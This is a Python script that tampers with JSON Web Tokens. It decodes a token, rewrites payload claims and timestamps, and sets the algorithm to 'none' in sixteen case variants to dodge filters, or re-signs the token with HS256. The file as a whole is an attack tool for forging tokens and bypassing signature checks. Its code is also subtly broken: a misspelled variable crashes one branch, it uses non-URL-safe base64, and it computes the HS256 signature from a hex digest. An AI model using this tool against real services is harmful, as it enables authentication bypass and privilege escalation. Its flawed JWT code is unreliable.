import json
import base64
import argparse
import time
import hmac
import hashlib
import binascii


alg_choices = ['none','None','NONE', 'nOne','noNe','nonE','NOne','NoNe','NonE','nONe','nOnE','noNE','NONe','nONE','NoNE','NOnE', 'HS256']
jwt_token = []
header = {}
payload = {}
signature = ""
enc_key = ""
final_token = ""
opt_parser = argparse.ArgumentParser()

opt_parser.add_argument("-t","--token", required=True, help="JWT token")
opt_parser.add_argument("-d", "--data", required=False, help="Space-separated fields to add or edit in the payload. Formatted field:value", nargs='+')
opt_parser.add_argument("-i", "--iat", required=False, help="Issued at time, can be now to use current time, or a specified Unix time.")
opt_parser.add_argument("-x", "--exp", required=False, help="Expiration time, can be an offset in minutes from the iat by prefixing with +, or a valid Unix time.")
opt_parser.add_argument("-a", "--alg", required=False, help="Signature encryption algorithm.", choices=alg_choices)
opt_parser.add_argument("-k", "--key", required=False, help="Encryption key.")
opt_parser.add_argument("-p", "--print", required=False, help="Print token contents before processing.", action="store_true")

args = opt_parser.parse_args()

if args.token:
	jwt_token = args.token.split('.')
	while True:
		try:
			header = json.loads(base64.b64decode(jwt_token[0]))
			break
		except binascii.Error:
			jwt_token[0] = jwt_token[0] + '='
	while True:
		try:
			payload = json.loads(base64.b64decode(jwt_token[1]))
			break
		except binascii.Error:
			jwt_token[1] = jwt_token[1] + '='

if args.print:
	print(header, payload)

if args.data:
	for arg in args.data:
		split_arg = arg.split(':')
		payload[split_arg[0]] = split_arg[1]

if args.alg:
	header["alg"] = args.alg

if args.iat:
	if args.iat == "now":
		payload["iat"] = time.time()
	else:
		payload["iat"] = float(args.iat)

if args.exp:
	if args.exp[0] == '+':
		offset = int(args.exp[1:]) * 60			
		payload["exp"] = payload["iat"] + offset
	else:
		palyoad["exp"] = float(args.exp)

if args.key:
	enc_key = args.key


final_header = str(base64.b64encode(bytes(json.dumps(header), 'latin-1')))
final_header = final_header[2:len(final_header)-1].strip('=')
final_payload = str(base64.b64encode(bytes(json.dumps(payload), 'latin-1')))
final_payload = final_payload[2:len(final_payload)-1].strip('=')
final_token = final_header + '.' + final_payload

if header["alg"] == "HS256":
	if enc_key == '':
		print("No encryption key provided.")
	else:
		signature = str(base64.b64encode(bytes(hmac.new(bytes(enc_key, 'latin-1'), msg=bytes(final_token, 'latin-1'), digestmod=hashlib.sha256).hexdigest(), 'latin-1')))
		signature = signature[2:len(signature)-1].strip('=')
	print(final_token + '.' + str(signature))
else:
	print(final_token + '.' + str(signature))

